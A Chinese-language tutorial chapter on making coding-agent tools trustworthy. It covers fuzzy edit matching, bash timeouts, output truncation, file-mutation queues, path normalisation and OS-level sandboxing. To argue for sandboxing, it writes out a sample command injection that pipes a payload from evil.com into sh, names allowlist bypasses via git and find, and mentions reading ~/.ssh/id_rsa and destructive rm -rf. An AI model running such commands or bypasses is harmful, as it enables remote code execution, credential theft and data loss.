---
title: "边界与信任"
chapter: 11
description: "如何让 Agent 的行动值得信赖：防御性工具工程、沙箱、权限"
---

import SourceReader from '../../components/tutorial/SourceReader';
import CodeComparison from '../../components/tutorial/CodeComparison';
import VideoEmbed from '../../components/tutorial/VideoEmbed.astro';
import StepFlow from '../../components/tutorial/StepFlow';

export const codeEditThreeStage = `// edit 工具的三阶段匹配：exact → fuzzy → error
function fuzzyFindText(content: string, oldText: string): FuzzyMatchResult {
  // 第一阶段：精确匹配
  const exactIndex = content.indexOf(oldText);
  if (exactIndex !== -1) {
    return { found: true, index: exactIndex,
      matchLength: oldText.length, usedFuzzyMatch: false,
      contentForReplacement: content };
  }

  // 第二阶段：fuzzy 匹配（normalize 后重试）
  const fuzzyContent = normalizeForFuzzyMatch(content);
  const fuzzyOldText = normalizeForFuzzyMatch(oldText);
  const fuzzyIndex = fuzzyContent.indexOf(fuzzyOldText);

  if (fuzzyIndex === -1) {
    return { found: false, index: -1, matchLength: 0,
      usedFuzzyMatch: false, contentForReplacement: content };
  }

  // fuzzy 匹配成功 — 在 normalized 空间做替换
  return { found: true, index: fuzzyIndex,
    matchLength: fuzzyOldText.length, usedFuzzyMatch: true,
    contentForReplacement: fuzzyContent };
}`;

export const codeNormalize = `// normalizeForFuzzyMatch — 抹平 token 空间与 byte 空间的差异
function normalizeForFuzzyMatch(text: string): string {
  return text
    .normalize("NFKC")
    // 去除每行尾部空白
    .split("\\n").map(line => line.trimEnd()).join("\\n")
    // 智能单引号 → 普通单引号
    .replace(/[\\u2018\\u2019\\u201A\\u201B]/g, "'")
    // 智能双引号 → 普通双引号
    .replace(/[\\u201C\\u201D\\u201E\\u201F]/g, '"')
    // 各种 dash/hyphen → ASCII hyphen
    .replace(/[\\u2010-\\u2015\\u2212]/g, "-")
    // 特殊空格 → 普通空格
    .replace(/[\\u00A0\\u2002-\\u200A\\u202F\\u205F\\u3000]/g, " ");
}`;

export const codeBashExec = `// bash 工具 — spawn + rolling buffer + timeout + kill
const child = spawn(shell, [...args, command], {
  cwd, detached: true,
  env: env ?? getShellEnv(),
  stdio: ["ignore", "pipe", "pipe"],
});

let timedOut = false;
let timeoutHandle: NodeJS.Timeout | undefined;
if (timeout !== undefined && timeout > 0) {
  timeoutHandle = setTimeout(() => {
    timedOut = true;
    if (child.pid) killProcessTree(child.pid);  // 超时就杀整棵进程树
  }, timeout * 1000);
}

// 滚动缓冲区：只保留最后 maxChunksBytes
const chunks: Buffer[] = [];
let chunksBytes = 0;
const maxChunksBytes = DEFAULT_MAX_BYTES * 2; // 100KB

child.stdout?.on("data", (data) => {
  chunks.push(data);
  chunksBytes += data.length;
  while (chunksBytes > maxChunksBytes && chunks.length > 1) {
    chunksBytes -= chunks.shift()!.length;  // 丢弃最旧的 chunk
  }
});`;

export const codeTruncate = `// truncateHead — 文件读取，保留开头
function truncateHead(content: string, options = {}): TruncationResult {
  const maxLines = options.maxLines ?? 2000;
  const maxBytes = options.maxBytes ?? 50 * 1024; // 50KB
  // 逐行累加，哪个限制先到就停
  for (let i = 0; i < lines.length && i < maxLines; i++) {
    const lineBytes = Buffer.byteLength(line, "utf-8") + (i > 0 ? 1 : 0);
    if (outputBytes + lineBytes > maxBytes) { truncatedBy = "bytes"; break; }
    outputLines.push(line); outputBytes += lineBytes;
  }
  return { content: outputLines.join("\\n"), truncated: true, truncatedBy };
}

// truncateTail — bash 输出，保留结尾（错误信息在最后）
function truncateTail(content: string, options = {}): TruncationResult {
  // 从末尾往回收集，逻辑对称
  for (let i = lines.length - 1; i >= 0 && outputLines.length < maxLines; i--) {
    if (outputBytes + lineBytes > maxBytes) { truncatedBy = "bytes"; break; }
    outputLines.unshift(line); outputBytes += lineBytes;
  }
}`;

export const codeFileMutationQueue = `// 文件变更队列 — Promise 链保证同文件串行，不同文件并行
const fileMutationQueues = new Map<string, Promise<void>>();

async function withFileMutationQueue<T>(
  filePath: string, fn: () => Promise<T>
): Promise<T> {
  const key = await getMutationQueueKey(filePath); // realpath 解析符号链接
  const currentQueue = fileMutationQueues.get(key) ?? Promise.resolve();

  let releaseNext!: () => void;
  const nextQueue = new Promise<void>(resolve => { releaseNext = resolve; });
  fileMutationQueues.set(key, currentQueue.then(() => nextQueue));

  await currentQueue;  // 等前面的操作完成
  try {
    return await fn(); // 执行本次变更
  } finally {
    releaseNext();     // 释放下一个等待者
    // 清理：如果队列尾部就是自己，删除整个条目
    if (fileMutationQueues.get(key) === currentQueue.then(() => nextQueue)) {
      fileMutationQueues.delete(key);
    }
  }
}`;

export const codePathResolve = `// resolveReadPath — 5 种变体尝试，解决 LLM 路径幻觉
function resolveReadPath(filePath: string, cwd: string): string {
  const resolved = resolveToCwd(filePath, cwd);

  if (fileExists(resolved)) return resolved;

  // 变体 1: macOS 截图 AM/PM 前的 narrow no-break space
  const amPmVariant = tryMacOSScreenshotPath(resolved);
  if (amPmVariant !== resolved && fileExists(amPmVariant)) return amPmVariant;

  // 变体 2: macOS NFD 分解形式（é → e + ́）
  const nfdVariant = tryNFDVariant(resolved);
  if (nfdVariant !== resolved && fileExists(nfdVariant)) return nfdVariant;

  // 变体 3: macOS 弯引号（Capture d\u2019ecran）
  const curlyVariant = tryCurlyQuoteVariant(resolved);
  if (curlyVariant !== resolved && fileExists(curlyVariant)) return curlyVariant;

  // 变体 4: NFD + 弯引号组合（法语 macOS 截图）
  const nfdCurlyVariant = tryCurlyQuoteVariant(nfdVariant);
  if (nfdCurlyVariant !== resolved && fileExists(nfdCurlyVariant)) return nfdCurlyVariant;

  return resolved; // 都不匹配，返回原始路径（让后续报错）
}`;

export const codeErrorBad = `// 糟糕的错误信息 — 给人类看的
throw new Error("Edit failed");
// 或者更常见的：
throw new Error("String not found in file");
// LLM 看到这个后会做什么？
// → 重试相同的操作（因为不知道为什么失败）
// → 循环 5 次，每次都失败`;

export const codeErrorGood = `// Pi 的错误信息 — 给 LLM 看的，包含修复指令
throw new Error(
  \`Found \${occurrences} occurrences of the text in \${path}. \` +
  \`The text must be unique. \` +
  \`Please provide more context to make it unique.\`
);

// 另一个例子：
throw new Error(
  \`Could not find the exact text in \${path}. \` +
  \`The old text must match exactly \` +
  \`including all whitespace and newlines.\`
);
// LLM 看到后：知道原因 + 知道怎么修`;

export const codeErrorBadExample = `// 坏的错误信息
Error: edit failed`;

export const codeErrorGoodExample = `// 好的错误信息
Error: edit failed — exact match not found.
File: src/config.ts (line 42)
Searched for: "apiUrl"
Hint: The file contains smart quotes (\u201c\u201d).
Try: Include more surrounding context,
     or check for Unicode differences.`;

## Agent 做错了，甚至做了危险的事

> 你的控制回路跑起来了。Ch10 的事件队列在分发，重试机制在工作，上下文压缩在保护记忆。你觉得 Agent 终于可以独当一面了。
>
> 于是你给了它一个真实任务：重构一个 TypeScript 项目，把散落在 8 个文件里的旧版 API 调用迁移到新 SDK。
>
> **第 3 分钟**，Agent 尝试编辑 `config.ts`。文件里有一对中文智能引号 `"production"`，Agent 在 diff 里用了普通引号 `"production"`。编辑失败。Agent 重试了一遍，用了完全相同的 oldText——当然又失败了。然后第三遍，第四遍。你意识到它永远无法成功，因为它根本看不到两种引号的区别——在 token 空间，它们可能是同一个东西，但在 byte 空间，它们是完全不同的字符。
>
> **第 7 分钟**，Agent 执行了一条 `grep -r "oldApi" .`。这个项目有 `node_modules`，grep 返回了 47MB 的输出。你的终端卡了 20 秒，然后 Agent 的上下文被这坨输出淹没了——它把接下来的两分钟花在"分析" grep 结果上，输出了一份没人需要的依赖关系报告。真正需要改的 8 个文件被挤出了上下文窗口。
>
> **第 12 分钟**，Agent 在等一条 `npm install` 完成。没有设超时。安装过程因为一个 registry 问题挂住了。你等了 10 分钟才发现 Agent 还停在那里。你没有任何选项——进程没有超时，也没有 kill 的逻辑。你只能 Ctrl+C 重来。
>
> **第 18 分钟**（重启后），Agent 读取了用户上传的一张截图路径 `~/Desktop/Capture d'écran 2024-01-15.png`。读取失败——`File not found`。文件明明在那里。你花了 5 分钟排查，发现 macOS 在文件名里用了 NFD 编码的 `é` 和一个 Unicode 弯引号 `'`，而 Agent 输出的路径用了 NFC 编码的 `é` 和直引号 `'`。肉眼完全看不出区别。
>
> **第 22 分钟**，你看到 Agent 执行了 `rm -rf ./src`。你的心跳停了一拍。幸好它只删除了 `./src/tmp`——但你在两秒钟的恐惧中意识到，你对 Agent 的文件操作没有任何防护。它有 bash 的全部权限。它随时可以执行 `rm -rf /`，而你唯一的保护是"LLM 大概不会这么做吧"。
>
> 你坐回椅子里，看着终端上闪烁的光标。
>
> 你的 Agent 能行动了，但它的行动不值得信赖。

---

## 为什么会痛：边界鸿沟与信任鸿沟

回顾 Ch9 的理论框架，这一章的所有痛点都可以归结为两条鸿沟。

**边界鸿沟：token 空间 ≠ byte 空间。** LLM 在 token 空间中推理——它处理的是语义单元，不是字节。当它生成一个引号字符时，它输出的是"引号"这个概念，而不是 U+0022 还是 U+201C。但文件系统在 byte 空间中运作——`"` 和 `"` 是完全不同的字节序列。智能引号、Unicode 空格、NFD/NFC 编码差异，这些都是 token 空间和 byte 空间之间的裂缝。每一次跨越这条边界的操作——edit、read、path resolve——都需要一个翻译层来弥合差异。

**信任鸿沟：能力越大，风险越大。** Agent 必须拥有足够的权限才能有用——它需要读写文件、执行命令、修改代码。但给予权限意味着给予破坏的能力。你不能让 Agent 执行 `rm -rf /`，但你也不能禁止它执行 `rm`——因为合法的清理操作需要它。信任不是二元的（全信任 / 零信任），它是一个连续的光谱，需要细粒度的架构设计。

**理论锚点：成本反转预测工具数量。** Ch9 提出的成本反转原理在这里有一个直接推论：工具越少，每个工具的可靠性越容易保证。Pi 用 4 个默认工具覆盖了 Vercel AI SDK 15 个工具的功能。这不是"功能不足"——是刻意的约束。工具数量和可靠性之间的关系是乘法的，不是加法的。

---

## 复合错误率：为什么可靠性是乘法而不是加法

一个 10 步的任务中，如果每一步的成功率是 85%（这已经是相当不错的单步可靠性了），那么整个任务的成功率是：

**0.85^10 = 19.7%**

五次中有四次失败。不是因为任何一步"特别差"，而是因为错误率在链式任务中是相乘的。这就是为什么从 85% 提升到 95% 不是"提高了 10%"——在 10 步任务中，它意味着从 19.7% 跃升到 59.9%。而从 95% 到 99%，任务成功率从 59.9% 变为 90.4%。

每个工具的每一个百分点的可靠性改进，都被链式任务放大了。这是防御性工具工程存在的根本原因。

---

## 防御性工具工程的七条原则

Pi 的工具系统不是一组"恰好能用"的实现。它们是一套经过深思熟虑的防御性工程——每个设计决策都在回答同一个问题：如何让 Agent 的行动值得信赖？

**1. 架构约束优于行为约束。** 不要在 prompt 里写"请不要编辑没读过的文件"——在代码里强制执行。Pi 的 edit 工具要求 `oldText` 精确匹配文件内容；如果 Agent 没有先用 read 工具看过文件，它不可能知道要替换什么文本。这不是"建议"，是架构级的不可能性。行为约束依赖 LLM 的遵从性（脆弱的），架构约束依赖代码的不变量（坚固的）。

**2. 歧义时失败。** 如果 edit 工具找到了 3 处匹配，它不会"猜一个最可能的"——它直接拒绝操作，返回错误信息。歧义是 bug 的温床；宁可让 Agent 多提供一些上下文重试，也不要让它在错误的位置做出不可逆的修改。Pi 的 `fuzzyFindText` 在 fuzzy 匹配成功后，还会用 `normalizeForFuzzyMatch` 检查 occurrence 数量——如果大于 1，直接报错。

**3. 可自修复的错误信息。** 错误消息不是给人看的——是给 LLM 看的。一个好的工具错误信息应该告诉 LLM 三件事：发生了什么、为什么发生、怎么修复。Pi 的 edit 错误信息 `"Found 3 occurrences of the text. The text must be unique. Please provide more context to make it unique."` 就是这个模式——LLM 读到它就知道该加更多上下文重试。

**4. 最小化工具集。** Pi 默认提供 4 个工具：`bash`、`edit`、`read`、`glob`。不是 15 个，不是 25 个。工具越多，LLM 选择错误工具的概率越高，工具之间的交互越复杂，测试矩阵越大。4 个精心设计的工具，胜过 15 个"差不多能用"的工具。

**5. 分离获取与变更。** Read 操作是免费的——Agent 可以不受限制地读取文件、搜索代码、浏览目录。但 Write 操作是受控的——edit 需要精确匹配，bash 可以被权限系统拦截。这种不对称是刻意的：鼓励 Agent 多看多读（信息越多决策越好），同时约束它的变更行为（每次写入都是一个风险点）。

**6. 输出截断是一等公民。** 截断不是"输出太长了就砍一刀"的补丁——它是 Pi 工具系统中的核心设计。`truncateHead` 用于文件读取（保留开头，因为文件结构在开头），`truncateTail` 用于 bash 输出（保留结尾，因为错误信息在最后）。两个函数都有双重限制：行数（2000 行）和字节数（50KB），哪个先到就停。超出部分保存到临时文件，并在输出末尾附上路径——Agent 需要时可以自己去读。

**7. Operations 抽象。** 每个工具的 I/O 操作都通过一个 `Operations` 接口注入，而不是硬编码 `fs.readFile`。这意味着同一个 edit 工具可以操作本地文件系统，也可以通过 SSH 操作远程文件，也可以在沙箱中运行——工具逻辑与执行环境完全解耦。这不是过度设计，是信任边界的基础设施：当你需要在不同信任级别的环境中运行同一个 Agent 时，你只需要替换 Operations 实现。

---

## 错误消息工程：给 LLM 写错误信息

传统软件中，错误消息的读者是人类开发者。Agent 系统中，错误消息的首要读者是 LLM。这个转变意味着完全不同的设计标准。

<CodeComparison client:visible
  left={{ code: codeErrorBad, label: "传统错误信息", language: "typescript" }}
  right={{ code: codeErrorGood, label: "Pi 的错误信息", language: "typescript" }}
/>

差别不在字数，在于**可操作性**。左边的错误信息是一个终止信号——LLM 读到它只能选择重试或放弃。右边的错误信息是一个修复指令——LLM 读到它知道问题是什么（多处匹配），知道规则是什么（必须唯一），知道怎么修（提供更多上下文）。

这不是理论推测。Aider 和 Cline 的实践数据显示，精心设计的工具错误信息可以将 Agent 自修复成功率提高 10-25%。在复合错误率的背景下，每个工具的 10% 改进，意味着 10 步任务成功率从 35% 跳到 50%。

再看一个更极端的对比——当 edit 因为字符编码差异失败时：

<CodeComparison client:visible
  left={{ code: codeErrorBadExample, label: "没有指引的错误", language: "typescript" }}
  right={{ code: codeErrorGoodExample, label: "包含 cause + rule + fix 的错误", language: "typescript" }}
/>

关键设计原则：

- **包含原因**：不是 "failed"，是 "found 3 occurrences"
- **包含规则**：不是隐含的，是 "text must be unique"
- **包含修复路径**：不是 "try again"，是 "provide more context to make it unique"
- **包含上下文**：文件路径、匹配数量、当前值——LLM 需要的所有信息

---

## 循环检测

Pi 目前没有实现循环检测。但这是业界公认的关键防御机制，值得了解其模式。

典型的循环检测需要回答一个问题：**Agent 是否在用相同的方式重复做同一件失败的事？** StrongDM 的 Attractor spec 定义了一种 "attractor state" 检测方法——如果 Agent 最近 N 次工具调用的输入/输出模式形成了一个循环（相同的 tool name + 相似的参数 + 相同的错误），则触发强制退出或策略切换。

实现不复杂：维护一个滑动窗口，对每次工具调用做 fingerprint（工具名 + 参数 hash + 结果 hash），当窗口内出现 K 次相同 fingerprint 时触发告警。成本很低——几行代码，几百字节内存——但它能打破那个让你在终端前无奈看 Agent 循环 5 次的僵局。

Pi 没有实现它，可能是因为"理解每一行"的极简哲学——如果用户场景中循环足够罕见，这个复杂度不值得引入。但对于生产级 Agent，这几乎是必需品。

---

## Pi 的解法：工具工程深度解剖

Pi 的工具实现总计约 1,270 行代码。这不是一个庞大的数字——但每一行都在解决一个具体的边界问题或信任问题。接下来我们逐个拆解 Pi 的核心工具，看看它们是如何在 token 空间和 byte 空间之间架起桥梁，同时守住信任边界的。

### Edit 工具 — 容错编辑的艺术

Edit 是 Agent 最高频的变更工具，也是最容易出错的。LLM 生成的 `oldText` 和文件中实际存储的文本之间，可能存在人眼完全无法察觉的差异。Pi 的 edit 工具用三阶段匹配来化解这个问题：

<SourceReader
  client:visible
  code={codeEditThreeStage}
  filename="pi/packages/coding-agent/src/tools/edit.ts"
  language="typescript"
  highlights={[
    { line: 1, note: "三阶段设计：每一阶段只在前一阶段失败时才执行，避免不必要的模糊匹配" },
    { line: 3, note: "第一阶段：精确匹配，零歧义。成功率约 90-95%，绝大多数编辑在这里完成" },
    { line: 11, note: "第二阶段：对内容和搜索文本同时 normalize，消除 Unicode 差异后重试" },
    { line: 16, note: "两阶段都失败才返回 found: false — 错误信息会引导 LLM 修正" },
    { line: 21, note: "fuzzy 匹配成功后，替换在 normalized 空间进行，确保结果一致" }
  ]}
/>

关键在第二阶段的 `normalizeForFuzzyMatch`。它不是一个通用的"模糊搜索"，而是针对 LLM 已知的字符映射问题做精确修正：

<SourceReader
  client:visible
  code={codeNormalize}
  filename="pi/packages/coding-agent/src/tools/edit.ts"
  language="typescript"
  highlights={[
    { line: 4, note: "NFKC 标准化：将 NFD 分解形式合并回组合形式（é 的两种编码统一）" },
    { line: 5, note: "去除行尾空白：LLM 经常在行尾多加或少加空格" },
    { line: 7, note: "智能引号 → ASCII 引号：LLM 的 Markdown 渲染器常常将 ' 转为 \u2018\u2019" },
    { line: 9, note: "智能双引号 → ASCII 双引号：同理，\" 被渲染为 \u201C\u201D" },
    { line: 11, note: "各种 dash → ASCII hyphen：em dash、en dash、minus sign 统一为 -" },
    { line: 13, note: "特殊空格 → 普通空格：non-breaking space、thin space 等 10+ 种 Unicode 空格" }
  ]}
/>

每种 normalization 对应边界鸿沟的一个具体实例——LLM "看到"的字符和文件系统"存储"的字符不同。LLM 在 token 空间中处理"引号"这个语义概念，输出时可能产生 `U+2018`（智能单引号），而文件中存储的是 `U+0027`（ASCII 单引号）。这不是 LLM 的 bug，是两个空间之间固有的阻抗不匹配。

<VideoEmbed compositionId="EditMatching" title="三阶段匹配" description="exact → fuzzy(normalize) → error(有指引)，跨越 token 和 byte 空间" duration="8s" />

**行业策略对比：**

| 策略 | 产品 | 原理 | 优势 | 劣势 |
|------|------|------|------|------|
| **精确 + fuzzy 后备** | Pi / Claude Code | 精确匹配优先，失败后 normalize 重试 | 可预测、可审计、不改变文件其他部分 | 无法处理结构性差异（如缩进变化） |
| **Sketch + Apply** | Cursor | LLM 生成 sketch diff，专用模型 apply | 支持大范围编辑、速度快 | 需要额外模型调用，apply 可能引入错误 |
| **多格式尝试** | Aider / Cline | 同时支持 whole-file、search-replace、unified diff | 灵活性高，LLM 选择最自然的格式 | 格式多 → 解析错误多，需要 lint 兜底 |

每种策略的选择都反映了对"边界鸿沟在哪里最大"的不同判断：Pi 认为字符级差异是主要矛盾；Cursor 认为生成完整 diff 太慢是主要矛盾；Aider 认为强迫 LLM 用单一格式是主要矛盾。没有绝对正确的答案——但 Pi 的方案最容易推理和调试。

### Bash 工具 — 安全执行的工程

Bash 是 Agent 最强大也最危险的工具。它能做任何事——包括你不想让它做的事。Pi 的 bash 实现在可控性上做了大量工程：

<SourceReader
  client:visible
  code={codeBashExec}
  filename="pi/packages/coding-agent/src/tools/bash.ts"
  language="typescript"
  highlights={[
    { line: 3, note: "detached: true — 在新的进程组中运行，确保 killProcessTree 能杀掉所有子进程" },
    { line: 10, note: "超时触发后，不是杀单个进程，而是杀整棵进程树（npm install 会 spawn 子进程）" },
    { line: 13, note: "killProcessTree 通过进程组 ID 发送信号，确保不会遗留僵尸进程" },
    { line: 17, note: "滚动缓冲区设计：内存中只保留最后 100KB，防止 47MB 的 grep 输出撑爆上下文" },
    { line: 25, note: "FIFO 淘汰：新 chunk 进来时，如果超限就丢弃最老的 chunk" }
  ]}
/>

三个关键设计决策：

- **Rolling Buffer + Temp File**：内存中只保留最后 100KB 给 LLM 看（滚动缓冲区），完整输出写到临时文件给人类看。这是成本反转的直接应用——50MB 日志常驻上下文会摧毁推理能力。`truncateTail` 保留尾部（错误信息通常在最后），完整输出写 temp file，Agent 需要时可以自己读取。
- **进程树 kill**：`detached: true` 让子进程在新进程组中运行，`killProcessTree(child.pid)` 通过 `-pid` 向整个进程组发送信号。为什么不用 `child.kill()`？因为 `npm install` 会 spawn `node`，`node` 又 spawn `npm`——单进程 kill 只杀了最外层，子进程变成孤儿继续运行。
- **Command Prefix**：spawn 时通过 shell args 注入 `set -e`（出错即停）等 shell 选项，确保脚本不会在静默错误后继续执行。

**安全边界的真相：** Trail of Bits 在审计 Claude Code 时发现，命令 allowlist 是安全剧场（security theater）。`git` 有 `--exec` 参数可以执行任意命令，`find` 有 `-exec`，`grep` 可以通过 `--include` 读取任意文件。**任何基于命令名的安全策略都可以被绕过。** 真正的安全边界必须在 OS 级别实现——这是下一节的主题。

### 输出截断 — 上下文保护

截断不是"输出太长了就砍一刀"。它是 Agent 上下文窗口的守门人——砍错了方向，Agent 就丢失了关键信息。

<SourceReader
  client:visible
  code={codeTruncate}
  filename="pi/packages/coding-agent/src/tools/truncate.ts"
  language="typescript"
  highlights={[
    { line: 1, note: "truncateHead 用于文件读取：文件结构和 import 在开头，保留头部最有价值" },
    { line: 4, note: "双重限制：行数（2000）和字节数（50KB），哪个先到就停" },
    { line: 8, note: "逐行累加 + UTF-8 字节计算：不会在多字节字符中间截断" },
    { line: 14, note: "truncateTail 用于 bash 输出：编译错误和运行时异常通常出现在末尾" },
    { line: 16, note: "从末尾往回收集——逻辑完全对称，但保留方向相反" }
  ]}
/>

双模式截断是一个看似简单但意义重大的设计。文件读取时，import 声明、类定义、函数签名都在前面——保留头部。Bash 输出时，编译错误、测试失败摘要、异常堆栈都在最后——保留尾部。方向搞反了，Agent 就看到了一堆没用的日志前缀，而真正需要的报错信息被截掉了。

<StepFlow client:visible steps={[
  { title: "问题：工具输出可能很大", content: "一个 50MB 的日志文件、一个 10000 行的命令输出——全量注入上下文会淹没有用信息。" },
  { title: "文件内容 → truncateHead", content: "文件的开头通常最重要（import、类定义、函数签名），所以保留头部，截断尾部。", code: "// read 工具\nif (content.length > maxChars) {\n  return content.slice(0, maxChars) + '\\n[truncated]';\n}" },
  { title: "命令输出 → truncateTail", content: "命令的错误信息通常在末尾（stack trace、error message），所以保留尾部，截断头部。", code: "// bash 工具\nif (output.length > maxChars) {\n  return '[truncated]\\n' + output.slice(-maxChars);\n}" },
]} />

**行业截断策略对比：**

| 策略 | 产品 | 做法 | 信息损失 |
|------|------|------|---------|
| **方向感知截断** | Pi / Claude Code | head（读文件）/ tail（bash） | 低——保留最有价值的部分 |
| **工具结果清理** | OpenAI Agents SDK | 超限时整体移除早期 tool result | 中——可能丢失重要的早期发现 |
| **观察遮蔽** | LangChain | 截断单条 observation 到固定长度 | 中——固定长度不区分内容类型 |
| **指针式存储** | Aider repo-map | 不放内容，放文件结构指针 | 低——但需要额外读取步骤 |

### 文件变更安全 — 并发与原子性

当 Agent 在一次任务中同时编辑 `index.ts` 和 `utils.ts` 时，没有问题。但当两个 edit 操作同时指向 `index.ts` 时——一个在第 10 行插入代码，另一个在第 20 行删除代码——行号就乱了。Pi 用 40 行代码解决了这个问题：

<SourceReader
  client:visible
  code={codeFileMutationQueue}
  filename="pi/packages/coding-agent/src/tools/file-mutation-queue.ts"
  language="typescript"
  highlights={[
    { line: 1, note: "核心思想：Map<文件路径, Promise 链>，同文件的操作排队执行，不同文件完全并行" },
    { line: 7, note: "realpath() 解析符号链接——a.ts 和 ./a.ts 和 symlink-to-a.ts 必须进同一个队列" },
    { line: 14, note: "await currentQueue 是关键：在前一个操作完成后才开始自己的操作" },
    { line: 16, note: "fn() 是实际的文件变更操作，在 try/finally 中执行确保锁一定被释放" },
    { line: 18, note: "releaseNext() 在 finally 中——即使操作失败，也要释放后续等待者，避免死锁" }
  ]}
/>

这是一个教科书级的 Promise 链队列。`realpath()` 的使用特别重要——如果 Agent 通过不同路径引用同一个文件（相对路径、绝对路径、符号链接），它们必须进入同一个队列。40 行代码，解决了并发文件操作的一整类 bug。

### 路径工程 — 隐形的可靠性

路径解析是最"隐形"的工程——做对了用户完全不知道它存在，做错了 5% 的文件操作莫名失败。

<SourceReader
  client:visible
  code={codePathResolve}
  filename="pi/packages/coding-agent/src/tools/read.ts"
  language="typescript"
  highlights={[
    { line: 1, note: "5 种变体尝试：不是随机猜测，每种都针对一个已知的平台问题" },
    { line: 7, note: "macOS 截图文件名中 AM/PM 前有 narrow no-break space (U+202F)，LLM 输出普通空格" },
    { line: 11, note: "macOS HFS+ 用 NFD 编码存储文件名：é 存为 e + \\u0301，但 LLM 输出 NFC 的 é" },
    { line: 15, note: "法语 macOS 截图文件名含弯引号 d\\u2019ecran，LLM 输出直引号 d'ecran" },
    { line: 19, note: "组合变体：法语 macOS 截图同时有 NFD + 弯引号两个问题" },
    { line: 23, note: "都不匹配就返回原始路径——让后续的 readFile 报错，错误信息会引导 LLM" }
  ]}
/>

这就是隐形可靠性——用户永远不知道它存在，但没有它，每一个在法语 macOS 上截图然后让 Agent 分析的用户，都会遇到莫名的 "File not found"。5 种变体覆盖了 macOS Unicode 路径的所有已知问题：NFD 分解、narrow NBSP、弯引号、以及它们的组合。

---

## 沙箱工程：OS 级安全边界

前面 bash 工具一节提到，Trail of Bits 审计发现命令 allowlist 是"安全剧场"。`git log --format='%H' --diff-filter=D -- "$(curl evil.com/payload | sh)"` 这样的注入，任何基于命令名白名单的方案都拦不住。LLM 生成的命令天然不可预测——你无法枚举所有安全的命令模式。

**真正的安全边界必须在 OS 级别。** 不是"这条命令能不能执行"，而是"这个进程能访问哪些资源"。

**隔离技术光谱：**

| 技术 | 隔离级别 | 冷启动延迟 | 典型场景 |
|------|---------|-----------|---------|
| **seccomp-bpf** | 系统调用过滤 | ~0ms | 单进程限制（禁止 network syscall） |
| **Bubblewrap** | 命名空间隔离 | ~5ms | 桌面应用沙箱（Flatpak 底层） |
| **Docker** | 容器隔离 | ~500ms | CI/CD、开发环境 |
| **gVisor** | 用户态内核 | ~200ms | 多租户云服务（GCP Cloud Run） |
| **WASM** | 指令级隔离 | ~1ms | 浏览器插件、边缘计算 |
| **Firecracker** | microVM | ~125ms | 极高安全要求（AWS Lambda） |

Claude Code 的实践：macOS 上使用 Seatbelt（Apple 沙箱框架），Linux 上使用 Bubblewrap（命名空间隔离），已开源为 `@anthropic-ai/sandbox-runtime`。核心原则是**双重隔离**——文件系统隔离（只能访问项目目录）和网络隔离（防止数据外泄）必须同时存在。只有文件系统隔离，Agent 可以 `curl` 把代码发出去；只有网络隔离，Agent 可以读取 `~/.ssh/id_rsa`。两者缺一不可。

Pi 本身没有内置沙箱——它依赖 Operations 抽象层。当 Operations 的底层实现指向一个沙箱环境时，所有工具自动获得沙箱保护。这就是第七条原则 "Operations 抽象" 的实际价值：安全策略可以在不修改任何工具代码的情况下升级。

---

## 不同产品为什么做了不同选择

每个 Agent 产品都面临相同的边界鸿沟和信任鸿沟，但它们做出了不同的工程权衡。理解"为什么不同"比知道"谁更好"更有价值——因为不同选择背后是不同的产品定位和用户信任模型。

| 维度 | Pi | Claude Code | Cursor | Cline / Aider | 为什么不同 |
|------|-----|------------|--------|--------------|-----------|
| **编辑策略** | 精确 + fuzzy normalize | 精确 + fuzzy normalize | Sketch + Apply model | 多格式 (whole-file / diff / search-replace) | Pi/CC 优先可审计性；Cursor 优先速度和大范围编辑；Cline/Aider 优先 LLM 表达自由度 |
| **Bash 安全** | 超时 + 进程树 kill + rolling buffer | 同左 + Seatbelt/Bubblewrap 沙箱 | 不直接暴露 bash | 超时 + 用户确认 | CC 有沙箱是因为 Anthropic 做了安全审计；Pi 作为教学框架简化了沙箱；Cursor 作为 IDE 绕过了 bash |
| **输出截断** | head/tail 双模式 + temp file | head/tail 双模式 + temp file | IDE 内置文件浏览 | 固定长度截断 | Pi/CC 需要在终端中工作，必须自己管理输出长度；Cursor 在 IDE 中有原生的文件预览 |
| **文件安全** | Promise 链队列 + realpath | Promise 链队列 + realpath | LSP + file watcher | 基于 git diff 的回滚 | Pi/CC 直接操作文件系统，需要自己保证一致性；Cursor 借助 IDE 的文件管理；Cline/Aider 用 git 做安全网 |
| **权限模型** | 读免费 / 写需确认 | 读免费 / 写需确认 + 沙箱 | IDE 集成权限 | 每次操作确认 或 YOLO 模式 | Pi/CC 区分读/写的成本不对称；Cline 的 YOLO 模式是信任用户判断的极端选择 |

核心洞察：产品定位决定了信任模型。IDE 内嵌产品（Cursor）可以借助 IDE 的安全基础设施；终端产品（Pi / Claude Code）必须自建全部防御；开源框架（Cline / Aider）把安全决策交给用户——灵活但风险自担。

---

## 动手实现

本章的 demo 在 `demos/11-trust/` 中。两个脚本分别演示"脆弱工具"和"防御性工具"的差异：

```
cd demos/11-trust && npx tsx src/01-fragile-tools.ts   # 观察失败
cd demos/11-trust && npx tsx src/02-defensive-tools.ts  # 观察防御
```

`01-fragile-tools.ts` 故意使用精确匹配、无超时、无截断的脆弱实现——你会看到智能引号导致编辑失败、大输出淹没上下文、超时命令挂死。`02-defensive-tools.ts` 应用本章的防御模式——fuzzy 匹配、rolling buffer、进程树 kill。对比两者的输出，你会直观理解每种防御机制的价值。

建议修改 `02-defensive-tools.ts` 中的 normalize 函数，去掉某一种字符映射，观察哪些编辑场景会因此失败。这是理解边界鸿沟最好的方式——亲手把桥拆掉。

---

## 元技能：如何判断"这是工具问题"

当 Agent 表现不佳时，怎么判断是模型能力不足，还是工具工程的问题？几个典型症状：

- **反复重试相同操作**：几乎一定是错误信息缺乏引导，LLM 不知道该怎么修正
- **编辑成功率突然下降**：检查是否有新的 Unicode 字符进入了代码库（例如从网页复制的代码）
- **长任务后期变"蠢"**：输出截断可能不够积极，上下文被无用信息淹没
- **偶发的"File not found"**：路径 normalize 覆盖不全

关键 metrics：edit first-match rate（精确匹配成功率，目标 > 90%）、bash timeout rate（超时率，目标 < 2%）、tool error self-recovery rate（自修复率，目标 > 70%）。如果 first-match rate 低于 85%，先检查 normalize 覆盖范围；如果 self-recovery rate 低于 50%，先改善错误信息。

---

## 简化思考

不是所有防御性工程都同等重要。可以分两类思考：

**随模型进步可简化的：** Fuzzy 匹配。随着模型对字符编码的理解越来越精确，智能引号问题会逐渐减少。未来的模型可能直接输出正确的 byte 序列，fuzzy 层变成一个几乎不被触发的后备。

